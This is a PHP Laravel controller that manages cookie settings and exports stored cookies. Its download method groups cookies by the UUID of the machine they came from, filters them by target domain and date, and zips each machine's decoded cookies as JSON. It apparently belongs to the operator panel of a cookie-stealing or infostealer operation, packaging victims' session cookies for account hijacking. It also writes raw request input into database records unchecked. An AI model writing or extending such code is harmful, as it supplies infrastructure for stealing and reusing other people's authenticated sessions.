<?php

namespace App\Http\Controllers;

use App\Models\Cookie;
use App\Models\CookieSetting;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

class CookieSettingController extends Controller
{
    public function index()
    {
        return view('pages.cookie_settings.index');
    }

    public function getItems()
    {
        $items = CookieSetting::all();

        foreach ($items as $item) {
            $item->edit_url = route('cookie_settings.info', ['id' => $item->id]);
            $item->remove_url = route('cookie_settings.remove', ['id' => $item->id]);
        }

        return datatables($items)->toJson();
    }

    public function getItem($id = null)
    {
        if (!$id) {
            return view('pages.cookie_settings.item');
        }

        $item = CookieSetting::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        return view('pages.cookie_settings.item', compact('item'));
    }

    public function removeItem($id)
    {
        $item = CookieSetting::query()->where('id', $id)->first();

        if (!$item) {
            return redirect()->back();
        }

        $item->forceDelete();

        return redirect()->back();
    }

    public function createOrEditItem(Request $r)
    {
        if ($r->post('id')) {
            CookieSetting::where('id', $r->post('id'))->update($r->all());
        } else {
            CookieSetting::create($r->all());
        }

        return redirect()->route('cookie_settings');
    }

    public function download(Request $r)
    {
        $url = $r->post('url');

        $now = Carbon::parse($r->post('date'));
        $end = Carbon::parse($r->post('date'))->addDay();

        $cookies = Cookie::with(['machine'])
            ->where('domain', 'like', '%' . $url . '%')
            ->where('created_at', '>=', $now)
            ->where('created_at', '<=', $end)
            ->get();

        if (count($cookies) === 0) {
            return redirect()->back();
        }

        $directory = Str::random();

        $items = [];

        foreach ($cookies as $cookie) {
            if (!isset($items[$cookie->machine->uuid]['value'])) {
                $items[$cookie->machine->uuid]['value'] = "";
            }

            $items[$cookie->machine->uuid]['value'] .= $cookie->decode . ',';
        }

        foreach ($items as $key => $value) {
            Storage::disk('public')->put($directory . '/' . $key . '.json', "[" . $value['value'] . "]");
        }

        $zip = new \ZipArchive();
        $fileName = Str::random() . '.zip';

        if ($zip->open(Storage::disk('public')->path($fileName), \ZipArchive::CREATE) === TRUE) {
            $files = File::files(Storage::disk('public')->path($directory));

            foreach ($files as $key => $value) {
                $relativeName = basename($value);
                $zip->addFile($value, $relativeName);
            }

            $zip->close();
        }

        Storage::disk('public')->deleteDirectory($directory);

        return response()->download(Storage::disk('public')->path($fileName));
    }
}
